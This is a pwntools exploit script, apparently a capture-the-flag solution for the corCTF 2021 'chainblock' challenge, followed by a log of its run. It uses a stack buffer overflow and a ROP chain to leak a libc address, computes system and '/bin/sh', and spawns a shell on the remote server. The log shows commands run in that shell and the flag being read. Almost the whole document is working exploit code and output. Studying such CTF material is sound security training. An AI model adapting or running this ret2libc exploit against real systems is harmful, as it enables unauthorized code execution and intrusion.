from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './chainblock'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "pwn.be.ax"
  PORT = 5000
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6")
else:
  s = process(BINARY)
  libc = elf.libc

pop_rdi_ret = 0x401493 # pop rdi; ret; 

s.recvuntil("Please enter your name: ")

buf  = b"A"*264
buf += p64(pop_rdi_ret)
buf += p64(elf.got.puts)
buf += p64(elf.plt.puts)
buf += p64(elf.sym.main)
s.sendline(buf)

s.recvuntil("identity!\n")
puts_addr   = u64(s.recvuntil("\n")[:-1] + b"\x00\x00")
libc_base   = puts_addr - libc.sym.puts
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))

print("puts_addr   =", hex(puts_addr))
print("libc_base   =", hex(libc_base))
print("system_addr =", hex(system_addr))
print("binsh_addr  =", hex(binsh_addr))

s.recvuntil("Please enter your name: ")
buf  = b"A"*264
buf += p64(pop_rdi_ret+1)
buf += p64(pop_rdi_ret)
buf += p64(binsh_addr)
buf += p64(system_addr)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/corCTF_2021/Pwn_Chainblock$ python3 solve.py r
[*] '/home/mito/CTF/corCTF_2021/Pwn_Chainblock/chainblock'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'./'
[+] Opening connection to pwn.be.ax on port 5000: Done
[*] '/home/mito/CTF/corCTF_2021/Pwn_Chainblock/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
puts_addr   = 0x7f25db2559d0
libc_base   = 0x7f25db1d5000
system_addr = 0x7f25db224a60
binsh_addr  = 0x7f25db380f05
[*] Switching to interactive mode
KYC failed, wrong identity!
$ id
uid=1000 gid=1000 groups=1000
$ ls -l
total 2180
-rw-rw-r-- 1 nobody nogroup      40 Aug 12 19:07 flag.txt
-rwxrwxr-x 1 nobody nogroup  216192 Aug 12 19:07 ld-linux-x86-64.so.2
-rwxrwxr-x 1 nobody nogroup 1983576 Aug 12 19:07 libc.so.6
-rwxrwxr-x 1 nobody nogroup   20488 Aug 14 20:42 run
$ cat flag.txt
corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}
'''
